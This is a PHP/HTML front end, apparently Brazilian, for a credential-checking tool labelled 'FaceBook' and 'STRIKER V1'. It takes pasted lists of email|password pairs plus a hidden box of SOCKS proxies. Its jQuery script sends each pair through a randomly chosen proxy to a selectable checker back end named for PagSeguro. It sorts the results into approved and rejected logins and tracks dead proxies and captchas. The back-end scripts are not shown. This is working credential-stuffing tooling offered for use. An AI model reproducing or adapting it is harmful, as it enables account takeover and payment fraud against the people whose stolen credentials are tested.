<?php  
require '../check.php';

?>
<!doctype html>
<html class="no-js" lang="en">

<head>
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>FaceBook</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- favicon
        ============================================ -->
    <link rel="shortcut icon" href="logo.png" type="image/x-png"/>
    <!-- Google Fonts
        ============================================ -->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,700,700i,800" rel="stylesheet">
    <!-- Bootstrap CSS
        ============================================ -->
    <!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    <style type="text/css">
        .elemento:before

         .container {
                width: 650px;
                height: 400px;
                margin-left: auto;
                margin-right: auto;
                border: 1px solid black;
            }
            ::-webkit-scrollbar {
    width: 8px;
}
::-webkit-scrollbar-track {
    background: #1e272e;
}
::-webkit-scrollbar-thumb {
    background: #888;
}
::-webkit-scrollbar-thumb:hover {
    background: #555;
}
    </style>
</head>

<body class="darklayout">          
            <div class="feed-mesage-project-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-12 ">

                            <div class="sparkline11-list shadow-reset mg-tb-30">
                                <div class="sparkline11-hd">
                                    <div class="main-sparkline11-hd">
                                        <center><h1>FaceBook</h1></center>
                                        <center><h4>&#9775; STRIKER V1 &#9775;</h4></center>
                                        <div class="sparkline11-outline-icon">
              
                                        </div>
                                    </div>
                                </div>
                                <div class="sparkline11-graph dashone-comment dashtwo-comment comment-scrollbar">
                                    <div class="daily-feed-list">
                                        <div class="daily-feed-img">
                                            </a>
                                        </div>
                                        <div class="daily-feed-content">

<!DOCTYPE html>
<!--get out, you will not copy my html-->
<html lang="pt-br">
    <head>
      <meta charset="utf-8">
      <title>FaceBook</title>
      <link rel="shortcut icon" href="">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    </head>
  <!--my own css-->
    <!--website content-->
    <body class="animated bounce">
      <!--top bar and navegation-->
  
     <!--first text box-->
     


    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.7/darkly/bootstrap.min.css" rel="stylesheet" integrity="sha384-S7YMK1xjUjSpEnF4P8hPUcgjXYLZKK3fQW1j5ObLSl787II9p8RO9XUGehRmKsxd" crossorigin="anonymous">


   <link href="https://fonts.googleapis.com/css?family=Poiret+One" rel="stylesheet">
 

</head>
<body>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script type="text/javascript">
</script>


    <center>
        <textarea id="lista" name="lista" rows="7" required="" style=" color:#fff;overflow:auto; width:50%; height:50%; text-align: center; border-radius: 20px; border:2px solid #2ecc71;  background:transparent;" cols="1"  placeholder="EMAIL|SENHA"></textarea>


        <textarea name="socks" id="socks" rows="9" class="form-control" style="width:1%;text-align:left;resize:none;margin-left:-10140px;margin-top:-193px;" placeholder=""></textarea>
                                            <span style="outline: none; overflow:auto; color: #FFF; resize:none;  color: white; text-align: center;">Status: </span> <span class="badge badge-custom" id="aguardando666">Aguardando...</span>
                                           <br> <span style="outline: none; overflow:auto; color: #FFF; resize:none;  color: #fff; text-align: center;">Carregadas: </span> <span class="badge badge-secondary" id="linhas">0</span>
                                                <span style="outline: none; overflow:auto; color: #FFF; resize:none;  color: #fff; text-align: center;">Testadas: </span> <span class="badge badge-warning" id="total">0</span>
                                          
                                       
                                        </div>
                                    </div>
                                <br>
                                  </center>
        <center><input id="botao" type="button" style="color: #fff; font-size: 13pt;text-align: center;" class="btn btn-success" onclick="enviar();" value="INICIAR"/></center>
            
            <center><span style="font-size:17px;margin-top:-31000px;position: absolute;margin-left:-10288px;"><b><font color="#FFFFF7">SELECIONE UM TESTADOR</font></b></span>
            <br>
            <select class="form-control" style="margin-top:-10290px;margin-left:800px;width: 200px;height:33px;" id="CHECKER" name="CHECKER">
            <option name="pagseguro" value="api.php" style="text-align: center;">PAGSEGURO</option>
            <option name="pagseguro" value="teste.php" style="text-align: center;">PROXY</option>
            </select>
<script title="ajax do checker">

// set audios vars.
var audioLive = new Audio('blop.mp3');


function contar1(){
        $(document).ready(function() {
            var count = parseInt($('#ap').html());
            count++;
            $('#ap').html(count+"");
        });
    }
    function contar2(){
        $(document).ready(function() {
            var count = parseInt($('#rp').html());
            count++;
            $('#rp').html(count+"");
        });
    }
    function contar2b(){
        $(document).ready(function() {
            var count = parseInt($('#rpb').html());
            count++;
            $('#rpb').html(count+"");
        });
    }
    function contar3(){
        $(document).ready(function() {
            var count = parseInt($('#total').html());
            count++;
            $('#total').html(count+"");
        });
    }
    function contar4(){
        $(document).ready(function() {
            var count = parseInt($('#linhas').html());
            count++;
            $('#linhas').html(count+"");
        });
    }
function randomFrom(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function enviar() {
                if ($('#lista').val().trim() == '') {  
                return false;
                }
                var linha = $("#lista").val();
                var gate = document.getElementById("CHECKER").value;
                var linhaenviar = linha.split("\n");
                linhaenviar.forEach(function (value, index) {
                    contar4();
                    var proxies = $('#socks').val().replace(',', '').split('\n');
                    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                    setTimeout(
                            function () {
                                $.ajax({
                                    url: gate + '?lista=' + value + '&proxy=' + proxy,
                                    type: 'GET',
                                    async: true,
                                    success: function (resultado) {
                                        contar3();
                                        if(resultado.match("#APROVADA")){
                                            removelinha();
                                            aprovados(resultado + "");
                                            contar1();
                                            audioLive.play();
                                        }
                                        if(resultado.match("#Socks Die")){
                                            removelinha();
                                            semvale(resultado + "");
                                            contar1();
                                        }
                                        if(resultado.match("#REPROVADA")){
                                            removelinha();
                                            reprovadas(resultado + "\n");
                                            contar2();
                                        }

                                        if(resultado.match("#Captcha")){
                                            removelinha();
                                            bugs(resultado + "");
                                            contar2b();
                                        }
                                    }
                                });

                            }, 400 * index);

                });
            }
            function aprovados(str) {
                $(".aprovados").append(str + "<br>");
            }
            function proxydie(str) {
                $(".reprovadas").append(str + "<br>");
            }
            function reprovadas(str) {
                $(".reprovadas").append(str + "<br>");
            }
            function bugs(str) {
                $(".bugs").append(str + "<br>");
            }
            function removelinha() {
                var lines = $("#lista").val().split('\n');
                lines.splice(0, 1);
                $("#lista").val(lines.join("\n"));
            }
</script>
        </div>
    </center>
    <center><br>
           <div class="container">
    <div class="panel panel-content" style="width:auto; position:relative;right:auto;">
       <div style="text-align: center; color: #2ECC71;" class="panel-heading"><strong> Aprovadas </strong>  <span style="outline: none; overflow:auto; color: #FFF; resize:none;  color: #2ECC71; text-align: center;"></span><span class="badge badge-success" id="ap">0</span></div>
       <div style="font-size: 15px; text-align:left; padding:5px;" class="aprovados">

   </div>
   </div>   
    
   <div class="panel panel-content" style="width:auto;em; position:relative;right:auto;">
       <div style="text-align: center; color: #E74C3C;" class="panel-heading"><strong> Reprovadas </strong>
                                            <span style="outline: none; overflow:auto; color: #FFF; resize:none;  color: #E74C3C; text-align: center;"></span> <span class="badge badge-danger" id="rp">0</span></div>
       <div style="font-size: 15px; text-align:left; padding:5px" class="reprovadas">
       
   </div>
   </div>
    </center>





                                        </div>
                                    </div>
                                   
                                
                                 
                                </div>
                            </div>
                        </div>
                      
                        <div class="col-lg-4">
                            <div class="sparkline8-list shadow-reset mg-tb-30">
                          
                                </div>
                            </div>
                                 <div class="income-order-visit-user-area">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-4">
                          
                                      
                                    </div>
                                    <div class="clear"></div>
                                </div>
                            </div>

                        </div>
                        </div>

                    </div>

                </div>
            </div>



            <!-- Transitions Start-->
          
        </div>
    </div>
    <!-- Footer Start-->
   
    <!-- Footer End-->
    <!-- Chat Box Start-->
  
    <!-- Chat Box End-->
    <!-- jquery
        ============================================ -->
    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <!-- bootstrap JS
        ============================================ -->
    <script src="js/bootstrap.min.js"></script>
    <!-- meanmenu JS
        ============================================ -->
    <script src="js/jquery.meanmenu.js"></script>
    <!-- mCustomScrollbar JS
        ============================================ -->
    <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
    <!-- sticky JS
        ============================================ -->
    <script src="js/jquery.sticky.js"></script>
    <!-- scrollUp JS
        ============================================ -->
    <script src="js/jquery.scrollUp.min.js"></script>
    <!-- scrollUp JS
        ============================================ -->
    <script src="js/wow/wow.min.js"></script>
    <!-- counterup JS
        ============================================ -->
    <script src="js/counterup/jquery.counterup.min.js"></script>
    <script src="js/counterup/waypoints.min.js"></script>
    <script src="js/counterup/counterup-active.js"></script>
    <!-- jvectormap JS
        ============================================ -->
    <script src="js/jvectormap/jquery-jvectormap-2.0.2.min.js"></script>
    <script src="js/jvectormap/jquery-jvectormap-world-mill-en.js"></script>
    <script src="js/jvectormap/jvectormap-active.js"></script>
    <!-- peity JS
        ============================================ -->
    <script src="js/peity/jquery.peity.min.js"></script>
    <script src="js/peity/peity-active.js"></script>
    <!-- sparkline JS
        ============================================ -->
    <script src="js/sparkline/jquery.sparkline.min.js"></script>
    <script src="js/sparkline/sparkline-active.js"></script>
    <!-- flot JS
        ============================================ -->
    <script src="js/flot/jquery.flot.js"></script>
    <script src="js/flot/jquery.flot.tooltip.min.js"></script>
    <script src="js/flot/jquery.flot.spline.js"></script>
    <script src="js/flot/jquery.flot.resize.js"></script>
    <script src="js/flot/jquery.flot.pie.js"></script>
    <script src="js/flot/jquery.flot.symbol.js"></script>
    <script src="js/flot/jquery.flot.time.js"></script>
    <script src="js/flot/dashtwo-flot-active.js"></script>
    <!-- data table JS
        ============================================ -->
    <script src="js/data-table/bootstrap-table.js"></script>
    <script src="js/data-table/tableExport.js"></script>
    <script src="js/data-table/data-table-active.js"></script>
    <script src="js/data-table/bootstrap-table-editable.js"></script>
    <script src="js/data-table/bootstrap-editable.js"></script>
    <script src="js/data-table/bootstrap-table-resizable.js"></script>
    <script src="js/data-table/colResizable-1.5.source.js"></script>
    <script src="js/data-table/bootstrap-table-export.js"></script>
    <!-- main JS
        ============================================ -->
    <script src="js/main.js"></script>
</body>

</html>